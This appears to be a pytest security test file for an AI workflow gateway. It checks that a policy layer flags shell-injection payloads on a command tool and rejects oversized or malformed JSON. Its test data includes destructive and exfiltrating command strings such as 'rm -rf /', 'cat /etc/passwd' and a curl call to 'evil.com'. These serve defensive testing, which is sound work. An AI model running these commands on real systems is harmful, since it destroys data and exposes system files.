"""Input-validation security tests (SEC-INP-001..008), behavioural.

Every test here used to POST a workflow to ``/v1/workflows`` (a path the
gateway does not serve — that is the Next.js BFF prefix) and assert
``status_code in (200, 201, 400, 422)``. That passes whether the malicious input
is accepted or rejected, so it asserted only that the service stayed up.

What replaces it depends on what the policy plane actually *does* with the input:

* **Command injection** is a real Airlock decision: a shell-metacharacter payload
  on a command tool is reported as ``rcepattern``. That is asserted here against
  the real enforcement endpoint ``POST /v1/runs/{id}/check-tool``.
* **SQL / NoSQL / XSS / path-traversal / null-byte** injection are NOT rejected
  at the API boundary by design, so asserting a 4xx would assert a contract the
  system does not implement. SQL injection is prevented *structurally* by
  parameterised ``sqlx`` queries (the string is stored as inert data, not
  executed); XSS is an *output-encoding* concern owned by the dashboard; the
  Postgres store has no NoSQL operators to inject into. A behavioural assertion
  of those would have to prove the query was not executed / the output was
  encoded, which is not observable through this API. They are skipped with that
  reason rather than left as ``status_code in (...)`` tautologies (#6).
* **Oversized / malformed / reasonable** payloads are already behavioural: they
  assert the request is rejected (or, for the control, accepted).
"""

import os
import httpx
import pytest

# The project the dev seed creates (db/migrations/20241223000002_seed_dev_data.sql).
# `POST /v1/workflows` requires it; every workflow payload below omitted it and got
# a 400, so these scenarios never reached the behaviour they were written to test.
SEED_PROJECT_ID = os.getenv("FD_SEED_PROJECT_ID", "prj_01JFVX0000000000000000001")


# RCE patterns score >= 60 (High/Critical); a detected shell injection must land
# there. Mirrors tests/security/test_airlock.py.
ELEVATED = 60


# ==========================================================================
# SEC-INP-005: Command injection — a real Airlock decision (rcepattern).
# ==========================================================================
class TestCommandInjectionDetected:
    """Shell-metacharacter payloads on a command tool are reported as
    ``rcepattern`` by the Airlock RCE layer (pipes, redirects, command
    substitution, separators), not merely accepted with a 2xx."""

    @pytest.mark.parametrize(
        "payload",
        [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& curl http://evil.com",
            "$(rm -rf /)",
            "`rm -rf /`",
            "\n rm -rf /",
        ],
        ids=["semicolon", "pipe", "and", "subshell", "backtick", "newline"],
    )
    def test_command_injection_is_flagged(self, check_tool, created_run: str, payload: str) -> None:
        decision = check_tool(created_run, "execute_command", {"command": f"ls {payload}"})
        assert decision["violation_type"] == "rcepattern", (
            f"a shell-injection payload must be reported as rcepattern, got "
            f"{decision.get('violation_type')!r} (reason {decision.get('reason')!r})"
        )
        assert decision["risk_score"] >= ELEVATED, decision["risk_score"]


# ==========================================================================
# SEC-INP-006: Oversized payload rejected — already behavioural (asserts a
# rejection, not a wide "up-or-down" range).
# ==========================================================================
class TestOversizedPayloadRejected:
    def test_oversized_payload_rejected(self, api_client: httpx.Client) -> None:
        """A 10 MB request body must be rejected (413/400/422), not accepted."""
        large_data = "x" * (10 * 1024 * 1024)
        workflow = {
            "name": "oversized-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "step1",
                        "name": "Step",
                        "type": "llm",
                        "config": {
                            "model": "claude-sonnet-4-20250514",
                            "system_prompt": large_data,
                            "max_tokens": 10,
                        },
                        "depends_on": [],
                    },
                ],
            },
            "project_id": SEED_PROJECT_ID,
            "max_iterations": 5,
            "on_error": "fail",
        }
        try:
            resp = api_client.post("/v1/workflows", json=workflow, timeout=60.0)
            assert resp.status_code in (400, 413, 422), (
                f"an oversized body must be rejected, got {resp.status_code}"
            )
        except httpx.ReadTimeout:
            # A timeout (connection dropped on the oversized body) is an
            # acceptable rejection of the payload.
            pass

    def test_reasonable_payload_accepted(self, api_client: httpx.Client) -> None:
        """Control: a small, well-formed body is accepted (guards against the
        oversized assertion passing because *everything* is rejected)."""
        workflow = {
            "name": "reasonable-test",
            "version": "1.0.0",
            "definition": {
                "steps": [
                    {
                        "id": "step1",
                        "name": "Step",
                        "type": "llm",
                        "config": {
                            "model": "claude-sonnet-4-20250514",
                            "system_prompt": "Hello",
                            "max_tokens": 10,
                        },
                        "depends_on": [],
                    },
                ],
            },
            "project_id": SEED_PROJECT_ID,
            "max_iterations": 5,
            "on_error": "fail",
        }
        resp = api_client.post("/v1/workflows", json=workflow)
        assert resp.status_code in (200, 201), resp.text


# ==========================================================================
# SEC-INP-007: Malformed JSON rejected — already behavioural.
# ==========================================================================
class TestMalformedJSONRejected:
    @pytest.mark.parametrize(
        "payload",
        ["{invalid json}", "{'single': 'quotes'}", '{"trailing": "comma",}', '{"missing": }'],
        ids=["braces", "single-quotes", "trailing-comma", "missing-value"],
    )
    def test_malformed_json_rejected(self, api_client: httpx.Client, payload: str) -> None:
        """Structurally-invalid JSON must be rejected with 400/422, not parsed."""
        resp = api_client.post(
            "/v1/workflows",
            content=payload,
            headers={"Content-Type": "application/json"},
        )
        assert resp.status_code in (400, 422), (
            f"malformed JSON must be rejected, got {resp.status_code}"
        )


# ==========================================================================
# Deliberately NOT converted — the premise (input rejection) is not the
# system's actual defense, so a behavioural assertion needs a different
# observation than this API offers. Skipped with the reason, listed on #6,
# rather than left as green `status_code in (...)` tautologies.
# ==========================================================================
class TestInputDefensesOutsideThisApi:
    @pytest.mark.skip(
        reason="SQL injection is prevented structurally by parameterised sqlx "
        "queries (input stored as inert data, not executed); asserting a 4xx "
        "would assert a contract the API does not implement — see #6"
    )
    def test_sql_injection(self) -> None:  # pragma: no cover
        ...

    @pytest.mark.skip(
        reason="Postgres is not a NoSQL store; `$gt`/`$ne`/`$where` are inert "
        "JSON with nothing to inject into — see #6"
    )
    def test_nosql_injection(self) -> None:  # pragma: no cover
        ...

    @pytest.mark.skip(
        reason="XSS is an output-encoding concern owned by the dashboard, not "
        "input rejection; assert it in the frontend render path — see #6"
    )
    def test_xss(self) -> None:  # pragma: no cover
        ...

    @pytest.mark.skip(
        reason="path-traversal detection on a file tool needs a live stack to "
        "confirm the wire verdict (allowlist-deny vs an RCE-layer flag) rather "
        "than guessing — see #6"
    )
    def test_path_traversal(self) -> None:  # pragma: no cover
        ...

    @pytest.mark.skip(
        reason="null-byte handling is stored as inert data at the API; the real "
        "risk is at the filesystem tool boundary and needs a live stack — see #6"
    )
    def test_null_byte_injection(self) -> None:  # pragma: no cover
        ...
